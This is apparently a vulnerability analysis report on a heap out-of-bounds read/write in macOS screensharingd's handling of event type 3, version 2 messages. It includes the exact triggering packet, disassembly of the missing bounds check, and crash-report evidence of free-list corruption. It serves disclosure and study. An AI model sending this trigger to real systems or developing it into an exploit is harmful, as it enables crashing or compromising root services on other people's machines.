# screensharingd EventMessage2 type 3 version 2 heap OOB read/write

## Verdict

**Confirmed current-build root-process heap OOB read/write.**

On macOS 27 beta `26A5378n`, `HandleEventMessage2` accepts a 16-byte
event-type-3 body. Event version 2 then accesses through body offset `0x1f`.
The parser performs a 16-byte adjacent load/transform/store and two later
8-byte adjacent reads. Probabilistic Guard Malloc captured the first OOB
instruction against an allocated 16-byte object, and the ordinary allocator
captured downstream MFM free-list corruption.

## Current-build baseline

- Binary:
  `/System/Library/CoreServices/RemoteManagement/screensharingd.bundle/Contents/MacOS/screensharingd`
- Version: 3.9.8, build 756.33
- Build: macOS 27 beta `26A5378n`
- Universal SHA-256:
  `cf4b4de7d192ec51710666ba013fb0ef068a8815ee4d289900da1879b4870549`
- Arm64e UUID: `332FB24B-1BD5-33C6-BEF8-3F53449C7032`
- Arm64e SHA-256:
  `1a2676e4ecf168969fcb31174312353008896adbef1dd33c9a6a9bd90bfeb0a9`
- Unified RFB parser: `0x100036384`
- Outer message type: `0x17`
- Source strings: `HandleEventMessage2`, `RFBServer/ViewerMessages.m`

All addresses below are unslid arm64e file addresses for this UUID.

## Input and allocation

The triggering frame is:

```text
17 00 00 10  00 02 00 03  00 00 00 00  00 00 00 00  00 00 00 00
```

```text
offset  size  meaning
0x00    u8    outer message type 0x17
0x01    u8    flags = 0
0x02    be16  declared body size = 16
0x04    be16  event version = 2
0x06    be16  event type = 3
0x08    12    remaining body bytes
```

The outer parser establishes only a global maximum and complete-frame
availability:

```asm
0x100039b80  cmp   w8, w9             ; declared size vs 50001
0x100039b84  b.lo  0x10003a538        ; accept declared size < 50001
0x10003a538  ...                       ; declared size + four-byte header
0x10003a54c  ...                       ; require complete frame buffered
0x10003bdc8  bl    _malloc_type_calloc ; calloc(1, declared size)
0x10003bddc  bl    0x100053478         ; copy exactly declared size
```

PGM independently reported `allocationSize: 16`, so the physical OOB claim
does not depend on ordinary-allocator slack.

## Per-event bound construction

The body base is `x20`. Flags bit 0 chooses a base minimum:

```asm
0x10003be3c  ldrb  w9, [sp, #0xd9]
0x10003be40  ands  w9, w9, #1
0x10003be44  mov   w11, #12
0x10003be48  mov   w14, #4
0x10003be4c  csel  w11, w14, w11, eq ; flags clear => 4, set => 12
```

The first table selects a per-event adjustment. Every adjusted minimum reaches
the same check:

```asm
0x10003f4b0  ldrh  w12, [sp, #0xda]  ; declared body size
0x10003f4b4  cmp    w12, w11
0x10003f4b8  b.hs   0x10003f554
```

The following table audits both sides of every event-family fixed-offset sink.
The listed access is the largest span reached by that handler; all smaller
loads/stores share the same checked body base.

| Event type | Size arm | Minimum, flags=0 | Largest body access | Required span | Result |
|---|---:|---:|---:|---:|---|
| 1, 2 | `0x10003f0f8`, add 8 | 12 | `0x10003f5c8`, u16 at `+0x0a` | 12 | matched |
| 3 | `0x10003f484`, add 12 | 16 | `0x10003f758`, qword vector at `+0x10` | 32 | **missing 16** |
| 4, 7 | `0x10003be7c`, add 4 | 8 | `0x10003f598`, u16 at `+0x06` | 8 | matched |
| 5, v1 | `0x10003f48c..498`, add 12 | 16 | `0x10003f7fc`, u16 at `+0x0e` | 16 | matched |
| 5, non-v1 | `0x10003f48c..498`, add 28 | 32 | `0x10003f824`, qword vector at `+0x10` | 32 | matched |
| 6 | `0x10003f474`, add 44 | 48 | `0x10003f6d4`, u16 at `+0x2e` | 48 | matched |
| 8 | `0x10003f4a0`, add 28 | 32 | `0x10003f900`, u16 at `+0x1e` | 32 | matched |
| 9 | `0x10003f46c`, OR 32 | 36 | `0x10003f68c`, u16 at `+0x22` | 36 | matched |
| 10 | no adjustment | 4 | no body sink | 0 | no gap |
| 11 | `0x10003f4a8..4ac`, OR 50 | 54 | `0x10003f93c`, u16 at `+0x34` | 54 | matched |
| 12, flags=0 | `0x10003f47c..4ac`, OR 18 | 22 | `0x1000416ac`, 16 bytes at `+6` | 22 | matched |
| 12, flags=1 | same arm, base 12 | 30 | `0x10004182c`, u64 at `+0x16` | 30 | matched |

For type 12, the optional access is explicitly paired with the flag-derived
minimum: the caller passes `w9 & 0xff` at `0x10003f70c`, and
`0x100041828 cbz w21, 0x100041838` skips the `+0x16` u64 read when the flag is
clear. No sibling gap was found there.

## Missing type-3 version bound

Type 3 unconditionally adds only 12:

```asm
0x10003f484  add   w11, w11, #0xc
```

With flags clear, the central `cmp` therefore accepts 16 bytes. Its consumer
then uses the separately supplied version:

```asm
0x10003f750  cmp   w8, #2
0x10003f754  b.lo  0x10003f9a0
0x10003f758  ldr   q0, [x20, #0x10]  ; read bytes 0x10..0x1f
0x10003f75c  rev64.16b v0, v0
0x10003f760  str   q0, [x20, #0x10]  ; write bytes 0x10..0x1f
```

The transformed adjacent bytes are consumed twice more:

```asm
0x10003f780  ldr   x8, [x20, #0x10]  ; conditional log read
0x10003f7c0  ldr   x8, [x20, #0x10]  ; unconditional read
```

### Complete sink operand audit

For all four OOB sinks:

1. Base operand: `x20`, the exact `calloc` result from `0x10003bdc8`.
2. Offset operand: fixed `0x10` encoded in each load/store instruction.
3. Width operand: 16 bytes for `q0`, 8 bytes for `x8`.
4. Required span: 32 bytes for the SIMD pair, 24 bytes for either later read.
5. Per-record bound: `0x10003f4b4 cmp w12,w11` establishes only
   `declared_size >= 16`.
6. Version condition: `0x10003f750 cmp w8,#2` selects the extra sinks but does
   not compare the declared size.
7. Global bound: `0x100039b80` establishes only `declared_size < 50001`; it
   cannot satisfy the missing lower bound.
8. Arithmetic width/sign: the declared size is a u16 throughout this path;
   there is no narrowing or sign conversion that supplies the missing span.

No instruction establishes either `declared_size >= 24` or
`declared_size >= 32` before these sinks.

The sibling type-5 arm does perform the missing version-sensitive adjustment:

```asm
0x10003f48c  add   w13, w11, #0x1c
0x10003f490  add   w11, w11, #0x0c
0x10003f494  cmp   w12, #0x100       ; raw big-endian version 1
0x10003f498  csel  w11, w13, w11, ne
```

This is a check present on a sibling and absent for type 3.

## Short-body pre-dispatch observation

The parser reads and byte-swaps the event type and version before applying the
central per-event minimum:

```asm
0x10003be20  ldrh  w10, [x20, #2]
0x10003be2c  strh  w13, [x20, #2]
0x10003be30  ldrh  w12, [x20]
0x10003be38  strh  w8, [x20]
```

Declared sizes 0..3 therefore violate the requested logical object size.
A bounded type-30 probe with a declared size of 2 reached this path without a
crash under PGM. Apple's allocator gives such tiny requests a 16-byte physical
slot, so the accesses stayed inside the actual allocation. This is parser
hardening evidence, not a second physical heap-corruption claim.

## Dynamic confirmation

`screensharingd-2026-07-23-082305.ips` records:

```text
userID: 0
triggered image offset: 0x3f758
x10 = 3
x11 = 16
x12 = 16
x20 = 0x11c703ff0
FAR = 0x11c704000 = x20 + 0x10
probGuardReport.errorType = out-of-bounds
probGuardReport.confidence = high
probGuardReport.allocationSize = 16
probGuardReport.allocationState = allocated
```

Two ordinary-allocator reports terminate in `mfm_free + 868` with a pointer
authentication trap after one trigger frame. One used Apple RFB security type
30 with a regular uid-501 Screen Sharing account. `HEAP_IMPACT.md` records the
observed neighboring MFM node before and after the vulnerable transform.

## Primitive

- Root-process adjacent heap OOB read/write.
- Deterministic in-place byte reversal of two adjacent 64-bit lanes.
- The transformed bytes originate in adjacent heap state, not directly in the
  packet.
- Confirmed corruption of an MFM free-list node followed by a PAC trap.
- Not currently an arbitrary write, code execution, or privilege escalation
  primitive.
